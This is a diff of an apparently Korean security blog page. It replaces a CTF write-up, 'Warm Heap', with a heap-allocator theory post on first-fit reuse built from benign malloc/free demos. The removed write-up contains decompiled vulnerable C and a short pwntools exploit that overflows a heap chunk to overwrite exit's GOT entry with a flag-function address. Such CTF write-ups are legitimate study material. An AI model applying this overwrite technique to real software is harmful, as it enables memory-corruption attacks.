@@ -13,28 +13,28 @@
     
 
     
-    <title>Warm Heap | j0n9hyun</title>
+    <title>[Heap Thoery] First Fit | j0n9hyun</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
-        <meta name="keywords" content="WriteUps">
+        <meta name="keywords" content="Theory">
     
-    <meta name="description" content="Warm Heap Binary File 123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&amp;#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-101">
-<meta name="keywords" content="WriteUps">
+    <meta name="description" content="First Fit Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다. 그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다. head - tail 12345678910111213141516#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main() &amp;#">
+<meta name="keywords" content="Theory">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Warm Heap">
-<meta property="og:url" content="http://j0n9hyun.github.io/2019/03/05/warm_heap/index.html">
+<meta property="og:title" content="[Heap Thoery] First Fit">
+<meta property="og:url" content="http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="Warm Heap Binary File 123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&amp;#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-101">
+<meta property="og:description" content="First Fit Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다. 그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다. head - tail 12345678910111213141516#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main() &amp;#">
 <meta property="og:locale" content="ko">
-<meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58141715-457cac00-7c7f-11e9-9752-78718ea07c25.png">
-<meta property="og:updated_time" content="2019-05-22T05:59:41.342Z">
+<meta property="og:image" content="https://user-images.githubusercontent.com/16969364/58300514-cc678b00-7e1d-11e9-80cf-c2f50de11e8c.png">
+<meta property="og:updated_time" content="2019-05-24T05:52:48.074Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Warm Heap">
-<meta name="twitter:description" content="Warm Heap Binary File 123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&amp;#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-101">
-<meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58141715-457cac00-7c7f-11e9-9752-78718ea07c25.png">
+<meta name="twitter:title" content="[Heap Thoery] First Fit">
+<meta name="twitter:description" content="First Fit Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다. 그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다. head - tail 12345678910111213141516#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main() &amp;#">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/16969364/58300514-cc678b00-7e1d-11e9-80cf-c2f50de11e8c.png">
     
-	<link rel="canonical" href="http://j0n9hyun.github.io/2019/03/05/warm_heap/">
+	<link rel="canonical" href="http://j0n9hyun.github.io/2019/05/24/heap-theory-first-fit/">
 
     
 
@@ -146,19 +146,19 @@
                         <div class="main-body-header">
     <h1 class="header">
     
-    <a class="page-title-link" href="/categories/WriteUps/">WriteUps</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/WriteUps/Pwn/">Pwn</a>
+    <a class="page-title-link" href="/categories/Theory/">Theory</a>
     </h1>
 </div>
 
                         <div class="main-body-content">
-                            <article id="post-warm_heap" class="article article-single article-type-post" itemscope itemprop="blogPost">
+                            <article id="post-Heap-Theory-First-Fit" class="article article-single article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
             <header class="article-header">
                 
     
         <h1 class="article-title" itemprop="name">
-        Warm Heap
+        [Heap Thoery] First Fit
         </h1>
     
 
@@ -168,8 +168,8 @@
             <div class="article-meta">
                 
     <div class="article-date">
-        <a href="/2019/03/05/warm_heap/" class="article-date">
-            <time datetime="2019-03-05T02:22:00.000Z" itemprop="datePublished">2019-03-05</time>
+        <a href="/2019/05/24/Heap-Theory-First-Fit/" class="article-date">
+            <time datetime="2019-05-24T05:51:30.000Z" itemprop="datePublished">2019-05-24</time>
         </a>
     </div>
 
@@ -178,27 +178,31 @@
                 
     <div class="article-tag">
         <i class="fa fa-tag"></i>
-        <a class="tag-link" href="/tags/WriteUps/">WriteUps</a>
+        <a class="tag-link" href="/tags/Theory/">Theory</a>
     </div>
 
-  			<span class="reading-time">⏱ 3 분</span>
+  			<span class="reading-time">⏱ 4 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
-            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h2 id="warm-heap"><a class="markdownIt-Anchor" href="#warm-heap"></a> Warm Heap</h2>
-<p><a href="https://github.com/j0n9hyun/CTF/files/3205199/warm_heap.zip" target="_blank" rel="noopener">Binary File</a></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> __fastcall __<span class="function">noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST10_8</span></span><br><span class="line">  <span class="keyword">void</span> *v4; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);</span><br><span class="line">  *(_DWORD *)v3 = <span class="number">1</span>;</span><br><span class="line">  *((_QWORD *)v3 + <span class="number">1</span>) = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">16u</span>LL);</span><br><span class="line">  *(_DWORD *)v4 = <span class="number">2</span>;</span><br><span class="line">  *((_QWORD *)v4 + <span class="number">1</span>) = <span class="built_in">malloc</span>(<span class="number">8u</span>LL);</span><br><span class="line">  fgets(&amp;s, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)v3 + <span class="number">1</span>), &amp;s);</span><br><span class="line">  fgets(&amp;s, <span class="number">4096</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)v4 + <span class="number">1</span>), &amp;s);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<center><small> [메인 함수] </small></center>
-<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58141715-457cac00-7c7f-11e9-9752-78718ea07c25.png">
-<center><small> [동작 과정] </small></center>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./warm_heap.bin'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./warm_heap.bin'</span>)</span><br><span class="line">flag = <span class="number">0x400826</span></span><br><span class="line">exit_got = <span class="number">0x601068d</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">40</span> + p64(elf.got[<span class="string">'exit'</span>]) + <span class="string">"\n"</span> + p64(flag)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<center><small> [Exploit Code] </small></center> <br>
+            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="first-fit"><a class="markdownIt-Anchor" href="#first-fit"></a> First Fit</h3>
+<p>Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다.<br>
+그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다.</p>
+<p><code>head - tail</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">300</span>);</span><br><span class="line">	<span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">250</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(300) A : %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(250) B : %p\n"</span>, b);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------free malloc A-------"</span>);</span><br><span class="line"></span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">250</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(250) A : %p\n"</span>, a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<center> [Example.c] </center><br><br>
+<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58300514-cc678b00-7e1d-11e9-80cf-c2f50de11e8c.png">
+<center> [Run] </center><br>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">char</span> *d = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(100) A : %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(100) B : %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(100) C : %p\n"</span>, c);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(100) D : %p\n"</span>, d);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line">	<span class="built_in">free</span>(b);</span><br><span class="line">	<span class="built_in">free</span>(c);</span><br><span class="line">	<span class="built_in">free</span>(d);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------free malloc A-------"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------free malloc B-------"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------free malloc C-------"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------free malloc D-------"</span>);</span><br><span class="line"></span><br><span class="line">	a = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	b = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	c = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	d = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------malloc(100) A-------"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------malloc(100) B-------"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------malloc(100) C-------"</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"-------malloc(100) D-------"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(100) A : %p\n"</span>, a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(100) B : %p\n"</span>, b);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(100) C : %p\n"</span>, c);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"malloc(100) D : %p\n"</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<center> <caption> [Example2.c] </caption> </center> <br><br>
+<img class="border-shadow" src="https://user-images.githubusercontent.com/16969364/58298844-fd44c180-7e17-11e9-97cc-e8d39f0a619d.PNG">
+<center> [Run] </center> <br>
 <style>
   img.border-shadow{
-      border:1px solid #888888;
-      box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
-  }
+          border:1px solid #888888;
+          box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+      }
 </style>
 
         </div>
@@ -207,7 +211,7 @@
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/03/05/warm_heap/" data-id="cjw1nydub001uhwfpjuu8kpuv" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/" data-id="cjw1nyds80004hwfptbd6kn3d" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -277,18 +281,20 @@
             "@type": "Person",
             "name": "j0n9hyun"
         },
-        "headline": "Warm Heap",
-        "image": "http://j0n9hyun.github.iohttps://user-images.githubusercontent.com/16969364/58141715-457cac00-7c7f-11e9-9752-78718ea07c25.png",
-        "keywords": "WriteUps",
-        "genre": "WriteUps Pwn",
-        "datePublished": "2019-03-05",
-        "dateCreated": "2019-03-05",
-        "dateModified": "2019-05-22",
-        "url": "http://j0n9hyun.github.io/2019/03/05/warm_heap/",
-        "description": " Warm Heap
-Binary File
-123456789101112131415161718192021void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  void *v3; // ST10_8  void *v4; // ST18_8  char s; // [rsp+20h] [rbp-101"
-        "wordCount": 287
+        "headline": "[Heap Thoery] First Fit",
+        "image": "http://j0n9hyun.github.iohttps://user-images.githubusercontent.com/16969364/58300514-cc678b00-7e1d-11e9-80cf-c2f50de11e8c.png",
+        "keywords": "Theory",
+        "genre": "Theory",
+        "datePublished": "2019-05-24",
+        "dateCreated": "2019-05-24",
+        "dateModified": "2019-05-24",
+        "url": "http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/",
+        "description": " First Fit
+Heap 문제를 공략하기 위해서는 기본적인 할당 흐름을 이해할 수 있어야 한다.
+그래서 이번 글에서는 블로그 활성화도 하고 복습도 할 겸 겸사겸사 끄적여보기로했다.
+head - tail
+12345678910111213141516#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main() &#"
+        "wordCount": 398
     }
 </script>
 
@@ -344,20 +350,10 @@ Binary File
         
 <nav id="article-nav">
     
-        <a href="/2019/03/19/tcache_theory/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">다음 글</strong>
-        <p class="article-nav-title">
-        
-            Tcache Theory Analysis
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
-    </a>
     
-    
-        <a href="/2019/02/19/betting/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2019/05/24/Security-Fest-2019-baby2/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">이전 글</strong>
-        <p class="article-nav-title">CODEGATE 2018 betting</p>
+        <p class="article-nav-title">Security Fest 2019 baby2</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -467,7 +463,7 @@ Binary File
     var disqus_shortname = 'j0n9hyun';
     
     
-    var disqus_url = 'http://j0n9hyun.github.io/2019/03/05/warm_heap/';
+    var disqus_url = 'http://j0n9hyun.github.io/2019/05/24/Heap-Theory-First-Fit/';
     
     (function() {
     var dsq = document.createElement('script');
